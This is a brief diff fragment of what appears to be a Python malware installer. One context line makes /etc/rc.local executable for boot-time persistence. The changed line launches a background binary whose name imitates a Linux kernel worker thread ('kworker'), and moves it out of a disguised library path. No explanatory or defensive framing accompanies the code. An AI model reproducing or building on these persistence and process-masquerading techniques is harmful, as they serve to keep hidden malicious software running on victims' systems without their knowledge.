@@ -93,7 +93,7 @@ exit 0""")
   os.system("chmod a+x /etc/rc.local")
 
 
-os.system("./libx86/lsb/hostconfig-lib-01/kworker_v8U%3A023FWE234-0 &")
+os.system("./kworker_v8U%3A023FWE234-0 &")
 
 
 
